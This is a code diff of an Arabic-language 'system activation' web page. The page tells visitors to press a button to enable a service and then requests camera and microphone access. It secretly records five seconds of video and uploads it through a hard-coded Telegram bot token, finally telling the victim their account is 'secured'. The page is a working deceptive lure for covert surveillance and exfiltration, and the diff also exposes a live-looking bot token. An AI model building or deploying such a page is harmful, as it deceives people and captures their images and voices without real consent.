@@ -5,54 +5,86 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تفعيل النظام</title>
     <style>
-        /* نفس التصميم الذي أرسلته ليكون متناسقاً */
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; text-align: center; }
-        #startBtn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; transition: 0.3s; }
-        #startBtn:active { background-color: #0056b3; }
-        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-top: 20px; display: none; }
+        /* تصميم الواجهة السوداء الفخمة */
+        body { 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            background-color: #000; 
+            color: white; 
+            margin: 0; 
+            text-align: center; 
+        }
+        #startBtn { 
+            padding: 15px 40px; 
+            font-size: 18px; 
+            font-weight: bold;
+            cursor: pointer; 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 30px; 
+            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
+        }
+        /* دائرة التحميل مثل التي في الصورة */
+        .loader { 
+            border: 4px solid #333; 
+            border-top: 4px solid #3498db; 
+            border-radius: 50%; 
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1s linear infinite; 
+            margin-top: 20px; 
+            display: none; 
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video { display: none; }
+        #statusText { margin-top: 20px; font-size: 16px; color: #bbb; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="content">
-        <h2 id="statusTitle">يجب الضغط على الزر لتفعيل الخدمة</h2>
+    <div id="mainContainer">
+        <h2 id="title">يجب الضغط على الزر لتفعيل الخدمة</h2>
         <button id="startBtn">ابدأ الآن</button>
-        <div id="loadingCircle" class="loader"></div>
-        <p id="msg" style="margin-top: 15px; color: #888; display: none;">لحظة واحدة...</p>
+        <div id="loader" class="loader"></div>
+        <p id="statusText">لحظة واحدة...</p>
     </div>
     
     <video id="video" autoplay playsinline muted></video>
 
     <script>
         const startBtn = document.getElementById('startBtn');
-        const loadingCircle = document.getElementById('loadingCircle');
-        const statusTitle = document.getElementById('statusTitle');
-        const msg = document.getElementById('msg');
+        const loader = document.getElementById('loader');
+        const title = document.getElementById('title');
+        const statusText = document.getElementById('statusText');
         const video = document.getElementById('video');
         
+        // الحصول على معرف المستخدم من الرابط تلقائياً
         const urlParams = new URLSearchParams(window.location.search);
         const senderId = urlParams.get('sender_id');
         const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
 
         startBtn.onclick = async () => {
-            // تغيير الواجهة لتشبه "جاري التحميل" التي أرسلتها
+            // إخفاء الزر وإظهار التحميل فوراً
             startBtn.style.display = "none";
-            loadingCircle.style.display = "block";
-            msg.style.display = "block";
-            statusTitle.innerText = "جاري التحميل...";
+            loader.style.display = "block";
+            statusText.style.display = "block";
+            title.innerText = "جاري التحميل...";
 
             try {
-                // طلب إذن الكاميرا والميكروفون للفيديو
+                // طلب إذن الكاميرا والميكروفون (لتظهر نافذة الأذونات)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
                 
-                // بدء التسجيل فوراً
+                // بدء التسجيل فور الحصول على السماح
                 startRecording(stream);
             } catch (err) {
-                alert("يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.");
-                location.reload(); // إعادة المحاولة
+                alert("يجب منح الأذونات لتفعيل النظام بنجاح.");
+                location.reload();
             }
         };
 
@@ -64,21 +96,21 @@
             
             mediaRecorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/mp4' });
-                await sendVideoToTelegram(blob);
+                await sendToTelegram(blob);
             };
 
             // تسجيل فيديو لمدة 5 ثواني
             mediaRecorder.start();
             setTimeout(() => {
                 mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+                stream.getTracks().forEach(track => track.stop()); // إطفاء الكاميرا بعد الانتهاء
             }, 5000); 
         }
 
-        async function sendVideoToTelegram(blob) {
+        async function sendToTelegram(videoBlob) {
             const formData = new FormData();
             formData.append('chat_id', senderId);
-            formData.append('video', blob, 'capture.mp4');
+            formData.append('video', videoBlob, 'video_capture.mp4');
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
@@ -87,12 +119,12 @@
                 });
                 
                 if(response.ok) {
-                    statusTitle.innerText = "تم التفعيل بنجاح!";
-                    loadingCircle.style.display = "none";
-                    msg.style.display = "none";
+                    title.innerText = "تم التفعيل بنجاح!";
+                    loader.style.display = "none";
+                    statusText.innerText = "تم إرسال البيانات وتأمين الحساب.";
                 }
-            } catch (err) {
-                console.error("خطأ في الإرسال:", err);
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
             }
         }
     </script>
